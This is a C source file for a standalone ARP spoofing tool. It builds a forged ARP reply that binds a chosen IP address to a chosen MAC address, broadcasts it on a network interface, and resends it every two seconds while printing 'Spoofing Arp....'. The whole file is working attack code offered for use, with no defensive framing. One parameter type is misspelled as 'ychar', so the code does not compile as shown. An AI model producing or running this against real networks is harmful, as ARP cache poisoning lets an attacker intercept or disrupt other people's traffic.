#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/if_ether.h>
#include <net/if_arp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>
#include <net/if.h>
#include <sys/ioctl.h>

#define ETHERTYPE_IP  0x0800  // EtherType for IPv4
#define ETHERTYPE_ARP 0x0806  // EtherType for ARP
#define ETH_ALEN 6   // Length of MAC address
#define IP_ALEN 4    // Length of IPv4 address
#define ARPHRD_ETHER 1 // Ethernet hardware type
#define ARPOP_REQUEST 1 // ARP request
#define ARPOP_REPLY 2

void convert_mac(const ychar *mac_str, uint8_t *mac) {
    if (mac_str == NULL || mac == NULL) {
        fprintf(stderr, "Invalid input to convert_mac\n");
        return;
    }

    int values[6];
    if (sscanf(mac_str, "%x:%x:%x:%x:%x:%x", 
               &values[0], &values[1], &values[2], 
               &values[3], &values[4], &values[5]) != 6) {
        fprintf(stderr, "Invalid MAC address format\n");
        return;
    }

    for (int i = 0; i < 6; ++i) {
        mac[i] = (uint8_t) values[i];
    }
}

int main(int argc, char* argv[]) {

    if(argc < 4){
        printf("Usage: arp <interface> <target_mac> <target_ip>\n");
        return 1;
    }

    char *interface_str = argv[1];
    char *target_mac_str = argv[2];
    char *target_ip_str = argv[3];

    uint8_t *target_mac = (uint8_t*) malloc(ETH_ALEN * sizeof(uint8_t));
    if (target_mac == NULL) {
        perror("malloc");
        return 1;
    }
    convert_mac(target_mac_str, target_mac);    

    struct ether_header *ethernet = (struct ether_header*) malloc(sizeof(struct ether_header));
    if (ethernet == NULL) {
        perror("malloc");
        free(target_mac);
        return 1;
    }

    struct ether_arp *arp = (struct ether_arp*) malloc(sizeof(struct ether_arp));
    if (arp == NULL) {
        perror("malloc");
        free(target_mac);
        free(ethernet);
        return 1;
    }

    ethernet->ether_type = htons(ETHERTYPE_ARP);
    memset(ethernet->ether_dhost, 0xff, ETH_ALEN); // 0xff broadcast to everyone; change later
    memcpy(ethernet->ether_shost, target_mac, ETH_ALEN);

    arp->arp_hrd = htons(ARPHRD_ETHER);
    arp->arp_pro = htons(ETHERTYPE_IP);
    arp->arp_hln = ETH_ALEN;
    arp->arp_pln = IP_ALEN;
    arp->arp_op = htons(ARPOP_REPLY);
    memcpy(arp->arp_sha, target_mac, ETH_ALEN);
    inet_pton(AF_INET, target_ip_str, arp->arp_spa);
    memset(arp->arp_tha, 0xff, ETH_ALEN);
    inet_pton(AF_INET, target_ip_str, arp->arp_tpa);

    int main_sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
    if (main_sock < 0) {
        perror("socket");
        free(target_mac);
        free(ethernet);
        free(arp);
        return 1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, interface_str, IFNAMSIZ - 1); // interface object
    if (ioctl(main_sock, SIOCGIFINDEX, &ifr) == -1) {
        perror("ioctl");
        close(main_sock);
        free(target_mac);
        free(ethernet);
        free(arp);
        return 1;
    }

    struct sockaddr_ll sa;
    memset(&sa, 0, sizeof(sa));
    sa.sll_ifindex = ifr.ifr_ifindex;
    sa.sll_halen = ETH_ALEN;
    memcpy(sa.sll_addr, ethernet->ether_dhost, ETH_ALEN);

    uint8_t packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
    memcpy(packet, ethernet, sizeof(struct ether_header));
    memcpy(packet + sizeof(struct ether_header), arp, sizeof(struct ether_arp));

    while (1) {
        if (sendto(main_sock, packet, sizeof(packet), 0, (struct sockaddr*)&sa, sizeof(sa)) == -1) {
            perror("sendto");
            close(main_sock);
            free(target_mac);
            free(ethernet);
            free(arp);
            return 1;
        }

        printf("Spoofing Arp....\n");
        sleep(2); // Adjust the sleep duration as needed
    }

    close(main_sock);
    free(target_mac);
    free(ethernet);
    free(arp);

    return 0;
}